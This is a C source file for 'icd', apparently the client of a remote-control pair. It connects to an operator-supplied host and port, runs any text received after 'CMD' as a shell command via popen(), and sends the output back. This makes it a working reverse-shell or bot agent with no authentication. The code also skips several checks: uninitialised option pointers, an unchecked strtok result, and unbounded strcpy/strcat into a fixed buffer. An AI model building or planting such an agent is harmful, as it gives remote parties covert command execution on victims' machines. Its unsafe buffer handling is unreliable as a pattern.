/*
 * Copyright (c) 2010 John Gordon <jgor@indiecom.org>
 *   and Doug Farre <dougfarre@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <limits.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include "core.h"
#include "sock.h"

void print_version() {
    printf("icd v%s\n", VERSION);
    exit(EXIT_SUCCESS);
}

void print_help() {
    printf("Usage: icd -[hv] -a ADDRESS -p PORT\n");
    printf("\n");
    printf("Options:\n");
    printf("  -a, --address=ADDRESS ipv4/6 address of the ircss server\n");
    printf("  -p, --port=PORT       port number on the ircss server\n");
    printf("  -h, --help            display this screen\n");
    printf("  -v, --version         display version\n");
    exit(EXIT_SUCCESS);
}

static struct option long_options[] = {
    {"port",    1, 0, 'p'},
    {"address", 1, 0, 'a'},
    {"help",    0, 0, 'h'},
    {"version", 0, 0, 'v'},
    {0, 0, 0, 0}
};

int main(int argc, char **argv) {
    int c;
    char *port, *address, str[LINE_MAX] = "", *ret;
    extern char *optarg;
    extern int optind;
    
    while (1) {
        int option_index = 0;

        c = getopt_long_only(argc, argv, "p:a:hv", long_options, &option_index);

        if (c == -1)
            break;

        switch(c) {
            case 'p':
                port = optarg;
                break;
            case 'a':
                address = optarg;
                break;
            case 'v':
                print_version();
                break;
            case 'h':
            default:
                print_help();
                break;
        }
    }

    if (optind < argc) {
        strncat(str, argv[optind++], LINE_MAX - strlen(str));
        while (optind < argc) {
            strcat(str, " ");
            strncat(str, argv[optind++], LINE_MAX - strlen(str));
        }
    }

    /*real code starts here*/
    if (port == NULL || address == NULL) print_help();

    int conn_sockfd, err;
    char buf[MAX_BUF + 1];

    conn_sockfd = get_conn_sock(address, atoi(port));

    while (1) {
        memset(&buf, 0, sizeof(buf));
        err = read(conn_sockfd, buf, MAX_BUF);
        if (err == -1) error("read failed.");
        else if (err == 0) break;
        char *tok;

        tok = strtok(buf, " ");

        if (strcmp(tok, "CMD") == 0) {
            tok = strtok(NULL, "\r\n");
            FILE *fp;
            int status, err;
            char line[MAX_BUF + 1];
            char msg[MAX_BUF + 5];

            fp = popen(tok, "r");
            if (fp == NULL) error("popen failed.");

            while (fgets(line, MAX_BUF, fp) != NULL) {
                strcpy(msg, "MSG ");
                strcat(msg, line);
                err = write(conn_sockfd, msg, strlen(msg)); 
                if (err == -1) error("write failed.");
            }

            status = pclose(fp);
            if (status == -1) error("pclose failed.");
        }       
    }

    close(conn_sockfd);

    exit(EXIT_SUCCESS);
}

